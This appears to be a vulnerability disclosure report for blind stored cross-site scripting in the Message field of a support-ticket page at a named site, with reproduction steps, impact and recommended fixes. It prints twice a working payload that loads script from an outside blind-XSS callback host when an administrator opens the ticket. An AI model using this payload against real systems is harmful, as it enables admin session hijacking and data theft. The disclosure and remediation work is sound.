## Title

Blind Stored Cross-Site Scripting (XSS) via Support Ticket Fields

## Vulnerability Type

Blind Stored XSS

## Summary

The support ticket functionality allows arbitrary HTML/JavaScript input without proper sanitization before storing and rendering it inside the admin panel.

An attacker can inject a malicious payload into ticket fields such as `Subject` or `Message`, which later executes when an administrator views the submitted support ticket.

## Vulnerable Endpoint

```http
https://kzlabs.com/64.php
```

## Vulnerable Parameter

```http
Message
```

## Steps to Reproduce

1. Navigate to the support ticket page:

```http
https://kzlabs.com/64.php
```

2. Open the support ticket form.

3. Insert the following payload into the `Message` field:

```html
"><script/src=//xss.report/c/xicor></script>"@x.com
```

4. Submit the support ticket.

5. Wait for an administrator to open the submitted ticket in the admin panel.

6. Observe that the payload executes and triggers a callback request to the attacker-controlled XSS endpoint.

## Payload Used

```html
"><script/src=//xss.report/c/xicor></script>"@x.com
```

## Proof of Concept

The application stores arbitrary HTML/JavaScript from the support ticket fields without sanitization and later renders it inside the admin panel.

As a result, attacker-controlled JavaScript executes when an administrator views the submitted ticket.

### Screenshot 1 — Malicious Payload Injected into Support Ticket

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/83a29bc8-5eaf-4401-9c76-90a730aeca87" />


### Screenshot 2 — Blind XSS Callback Triggered in Admin Panel

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/671dd956-4190-4ee5-a37d-8eefdf1ac023" />



## Impact

An attacker can exploit this vulnerability to:

- Execute arbitrary JavaScript in the administrator’s browser
- Hijack administrator sessions
- Perform unauthorized administrative actions
- Exfiltrate sensitive administrative data
- Fully compromise administrative functionality

## Recommendations for Fix

- Properly sanitize and encode all user-controlled input before rendering
- Disallow dangerous HTML tags and JavaScript execution contexts
- Apply contextual output encoding
- Avoid rendering raw user input directly into administrative panels
- Implement a strict Content Security Policy (CSP)
